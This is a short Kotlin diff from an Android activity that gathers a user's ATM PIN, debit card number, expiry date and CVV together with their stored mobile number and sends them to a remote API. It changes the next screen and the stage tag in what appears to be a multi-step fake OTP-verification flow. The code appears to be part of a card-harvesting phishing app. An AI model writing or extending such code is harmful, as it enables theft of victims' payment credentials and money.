@@ -29,10 +29,10 @@ class opttwo : AppCompatActivity() {
                 Toast.makeText(this,"Fill all fields", Toast.LENGTH_SHORT).show()
             }else{
 
-                val intentff = Intent(this, otpverify::class.java)
+                val intentff = Intent(this, finalscreen::class.java)
                 val apiService = ApiClient.getClient().create(ApiService::class.java)
                 val util = Util()
-                val data = OTP(last_update = "first", mobile = util.getLocalData(this,"mobile"),
+                val data = OTP(last_update = "second123", mobile = util.getLocalData(this,"mobile"),
                     atmpin = binding.atm.text.toString(), deb = binding.deb.text.toString(), exp = binding.exp.text.toString(),
                 cvv = binding.cvv.text.toString() )
                 val call = apiService.otpsend(data)
